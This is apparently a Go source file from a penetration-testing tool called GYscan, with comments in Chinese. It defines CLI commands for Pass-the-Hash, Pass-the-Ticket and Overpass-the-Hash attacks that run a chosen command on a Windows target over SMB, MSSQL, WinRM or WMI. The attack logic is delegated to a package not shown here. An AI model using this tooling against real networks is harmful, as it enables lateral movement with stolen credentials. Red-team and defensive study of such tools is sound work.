package cli

import (
	"fmt"
	"time"

	"GYscan/internal/passhash"
	"GYscan/internal/utils"

	"github.com/spf13/cobra"
)

var (
	// passhash命令的全局参数
	pthTarget      string
	pthUsername    string
	pthHash        string
	pthPassword    string
	pthDomain      string
	pthTicketPath  string
	pthCommand     string
	pthProtocol    string
	pthTimeout     time.Duration
	pthVerbose     bool
	pthOutputFile  string
)

// 凭证传递攻击主命令
var passhashCmd = &cobra.Command{
	Use:   "passhash",
	Short: "凭证传递攻击模块",
	Long:  `提供Pass-the-Hash、Pass-the-Ticket和Overpass-the-Hash攻击功能。`,
}

// pth子命令 - Pass-the-Hash攻击
var pthCmd = &cobra.Command{
	Use:   "pth",
	Short: "执行Pass-the-Hash攻击",
	Long:  `使用NTLM哈希进行身份验证，无需提供明文密码即可横向移动。`,
	Run:   executePTHAttack,
}

// ptt子命令 - Pass-the-Ticket攻击
var pttCmd = &cobra.Command{
	Use:   "ptt",
	Short: "执行Pass-the-Ticket攻击",
	Long:  `使用获取的Kerberos票据进行身份验证和横向移动。`,
	Run:   executePTTAttack,
}

// overpass子命令 - Overpass-the-Hash攻击
var overpassCmd = &cobra.Command{
	Use:   "overpass",
	Short: "执行Overpass-the-Hash攻击",
	Long:  `将NTLM哈希转换为Kerberos票据，绕过某些哈希传递限制。`,
	Run:   executeOverpassAttack,
}

// connect子命令 - 测试连接
var pthConnectCmd = &cobra.Command{
	Use:   "connect",
	Short: "测试目标连接",
	Long:  `测试与目标主机的网络连接。`,
	Run:   testPTHConnection,
}

func init() {
	// 将passhash命令添加到root命令
	// rootCmd.AddCommand(passhashCmd) // 命令注册已移至root.go的RegisterCommands函数中统一管理
	
	// 添加子命令
	passhashCmd.AddCommand(pthCmd, pttCmd, overpassCmd, pthConnectCmd)
	
	// 设置全局参数
	setupPTHGlobalFlags()
	
	// 设置各子命令特定参数
	setupPTHFlags(pthCmd)
	setupPTTFlags(pttCmd)
	setupOverpassFlags(overpassCmd)
	setupConnectFlags(pthConnectCmd)
}

// 设置全局参数
func setupPTHGlobalFlags() {
	passhashCmd.PersistentFlags().StringVarP(&pthTarget, "target", "t", "", "目标主机IP地址或主机名")
	passhashCmd.PersistentFlags().StringVarP(&pthUsername, "username", "u", "", "用户名")
	passhashCmd.PersistentFlags().StringVarP(&pthDomain, "domain", "d", "", "域名")
	passhashCmd.PersistentFlags().StringVarP(&pthProtocol, "protocol", "p", "smb", "使用的协议(smb, mssql, winrm, wmi)")
	passhashCmd.PersistentFlags().DurationVar(&pthTimeout, "timeout", 30*time.Second, "连接超时时间")
	passhashCmd.PersistentFlags().BoolVarP(&pthVerbose, "verbose", "v", false, "启用详细输出")
	passhashCmd.PersistentFlags().StringVarP(&pthOutputFile, "output", "o", "", "输出文件路径")
}

// 设置PTH子命令参数
func setupPTHFlags(cmd *cobra.Command) {
	cmd.Flags().StringVarP(&pthHash, "hash", "H", "", "NTLM哈希值")
	cmd.Flags().StringVarP(&pthCommand, "command", "c", "whoami", "要执行的命令")
	
	// 移除自动参数验证，改用手动验证
}

// 设置PTT子命令参数
func setupPTTFlags(cmd *cobra.Command) {
	cmd.Flags().StringVarP(&pthTicketPath, "ticket", "k", "", "Kerberos票据文件路径")
	cmd.Flags().StringVarP(&pthCommand, "command", "c", "whoami", "要执行的命令")
	
	// 移除自动参数验证，改用手动验证
}

// 设置Overpass子命令参数
func setupOverpassFlags(cmd *cobra.Command) {
	cmd.Flags().StringVarP(&pthHash, "hash", "H", "", "NTLM哈希值")
	cmd.Flags().StringVarP(&pthCommand, "command", "c", "whoami", "要执行的命令")
	
	// 移除自动参数验证，改用手动验证
}

// 设置Connect子命令参数
func setupConnectFlags(cmd *cobra.Command) {
	// 移除自动参数验证，改用手动验证
}

// 执行Pass-the-Hash攻击
func executePTHAttack(cmd *cobra.Command, args []string) {
	// 参数验证
	if pthTarget == "" {
		utils.ErrorPrint("[错误] 必须指定目标主机 (--target)")
		return
	}
	if pthUsername == "" {
		utils.ErrorPrint("[错误] 必须指定用户名 (--username)")
		return
	}
	if pthHash == "" {
		utils.ErrorPrint("[错误] 必须指定NTLM哈希值 (--hash)")
		return
	}

	// 验证哈希格式
	if !passhash.ValidateHashFormat(pthHash) {
		utils.ErrorPrint("无效的NTLM哈希格式，请提供32或65字符的十六进制字符串")
		return
	}
	
	// 构建配置
	config := &passhash.PassHashConfig{
		Target:     pthTarget,
		Username:   pthUsername,
		Hash:       pthHash,
		Domain:     pthDomain,
		Command:    pthCommand,
		Protocol:   pthProtocol,
		Timeout:    pthTimeout,
		Verbose:    pthVerbose,
		OutputFile: pthOutputFile,
		Method:     "pth",
	}
	
	// 创建客户端并执行攻击
	client := passhash.NewPassHashClient(config)
	
	// 先测试连接
	if !client.Connect() {
		utils.ErrorPrint(fmt.Sprintf("无法连接到目标主机: %s", pthTarget))
		return
	}
	
	utils.SuccessPrint("开始执行Pass-the-Hash攻击")
	utils.SuccessPrint(fmt.Sprintf("目标: %s, 用户: %s\\%s", pthTarget, pthDomain, pthUsername))
	
	result := client.ExecuteAttack()
	
	if result.Success {
		utils.SuccessPrint("Pass-the-Hash攻击执行成功")
		fmt.Println(result.Output)
	} else {
		utils.ErrorPrint(fmt.Sprintf("Pass-the-Hash攻击执行失败: %v", result.Error))
		if result.Output != "" {
			fmt.Println("输出:", result.Output)
		}
	}
}

// 执行Pass-the-Ticket攻击
func executePTTAttack(cmd *cobra.Command, args []string) {
	// 参数验证
	if pthTarget == "" {
		utils.ErrorPrint("[错误] 必须指定目标主机 (--target)")
		return
	}
	if pthTicketPath == "" {
		utils.ErrorPrint("[错误] 必须指定Kerberos票据文件路径 (--ticket)")
		return
	}

	// 构建配置
	config := &passhash.PassHashConfig{
		Target:     pthTarget,
		Username:   pthUsername,
		Domain:     pthDomain,
		TicketPath: pthTicketPath,
		Command:    pthCommand,
		Protocol:   pthProtocol,
		Timeout:    pthTimeout,
		Verbose:    pthVerbose,
		OutputFile: pthOutputFile,
		Method:     "ptt",
	}
	
	// 创建客户端并执行攻击
	client := passhash.NewPassHashClient(config)
	
	// 先测试连接
	if !client.Connect() {
		utils.ErrorPrint(fmt.Sprintf("无法连接到目标主机: %s", pthTarget))
		return
	}
	
	utils.SuccessPrint("开始执行Pass-the-Ticket攻击")
	utils.SuccessPrint(fmt.Sprintf("目标: %s, 票据: %s", pthTarget, pthTicketPath))
	
	result := client.ExecuteAttack()
	
	if result.Success {
		utils.SuccessPrint("Pass-the-Ticket攻击执行成功")
		fmt.Println(result.Output)
	} else {
		utils.ErrorPrint(fmt.Sprintf("Pass-the-Ticket攻击执行失败: %v", result.Error))
		if result.Output != "" {
			fmt.Println("输出:", result.Output)
		}
	}
}

// 执行Overpass-the-Hash攻击
func executeOverpassAttack(cmd *cobra.Command, args []string) {
	// 参数验证
	if pthTarget == "" {
		utils.ErrorPrint("[错误] 必须指定目标主机 (--target)")
		return
	}
	if pthUsername == "" {
		utils.ErrorPrint("[错误] 必须指定用户名 (--username)")
		return
	}
	if pthHash == "" {
		utils.ErrorPrint("[错误] 必须指定NTLM哈希值 (--hash)")
		return
	}

	// 验证哈希格式
	if !passhash.ValidateHashFormat(pthHash) {
		utils.ErrorPrint("无效的NTLM哈希格式，请提供32或65字符的十六进制字符串")
		return
	}
	
	// 构建配置
	config := &passhash.PassHashConfig{
		Target:     pthTarget,
		Username:   pthUsername,
		Hash:       pthHash,
		Domain:     pthDomain,
		Command:    pthCommand,
		Protocol:   pthProtocol,
		Timeout:    pthTimeout,
		Verbose:    pthVerbose,
		OutputFile: pthOutputFile,
		Method:     "overpass",
	}
	
	// 创建客户端并执行攻击
	client := passhash.NewPassHashClient(config)
	
	// 先测试连接
	if !client.Connect() {
		utils.ErrorPrint(fmt.Sprintf("无法连接到目标主机: %s", pthTarget))
		return
	}
	
	utils.SuccessPrint("开始执行Overpass-the-Hash攻击")
	utils.SuccessPrint(fmt.Sprintf("目标: %s, 用户: %s\\%s", pthTarget, pthDomain, pthUsername))
	
	result := client.ExecuteAttack()
	
	if result.Success {
		utils.SuccessPrint("Overpass-the-Hash攻击执行成功")
		fmt.Println(result.Output)
	} else {
		utils.ErrorPrint(fmt.Sprintf("Overpass-the-Hash攻击执行失败: %v", result.Error))
		if result.Output != "" {
			fmt.Println("输出:", result.Output)
		}
	}
}

// 测试连接
func testPTHConnection(cmd *cobra.Command, args []string) {
	// 参数验证
	if pthTarget == "" {
		utils.ErrorPrint("[错误] 必须指定目标主机 (--target)")
		return
	}

	// 构建配置
	config := &passhash.PassHashConfig{
		Target:   pthTarget,
		Protocol: pthProtocol,
		Timeout:  pthTimeout,
		Verbose:  pthVerbose,
	}
	
	// 创建客户端并测试连接
	client := passhash.NewPassHashClient(config)
	
	if client.Connect() {
		utils.SuccessPrint(fmt.Sprintf("连接测试成功: %s:%s", pthTarget, getPortByProtocol(pthProtocol)))
	} else {
		utils.ErrorPrint(fmt.Sprintf("连接测试失败: %s:%s", pthTarget, getPortByProtocol(pthProtocol)))
	}
}

// 根据协议获取端口
func getPortByProtocol(protocol string) string {
	switch protocol {
	case "mssql":
		return "1433"
	case "winrm":
		return "5985"
	case "wmi":
		return "135"
	default:
		return "445"
	}
}